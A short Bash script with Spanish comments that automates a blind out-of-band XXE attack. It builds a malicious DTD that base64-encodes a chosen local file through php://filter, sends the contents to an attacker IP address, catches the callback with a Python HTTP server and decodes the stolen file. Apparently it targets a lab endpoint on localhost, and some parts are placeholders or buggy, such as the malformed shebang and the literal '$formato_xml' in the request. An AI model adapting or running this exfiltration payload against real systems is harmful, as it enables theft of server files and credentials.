#/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename

ip="192.168.0.21";

malicious_dtd="""
  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://$ip/?file=%file;'>\">
  %eval;
  %exfil;

"""

echo $malicious_dtd

# Montar servidor
#
python3 -m http.server 80 &>response &

PID=$! #Guardar el PID del servidor para matarlo después

sleep 1; echo;  

formato_xml="algo"
curl -s -X POST "http://localhost:5000/process.php" -d '$formato_xml' &>/dev/null
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
                        # Sustitumos la parte de donde filtramo, para que vaya después del ?file= ^desde aquí . hacia * delante 
kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null




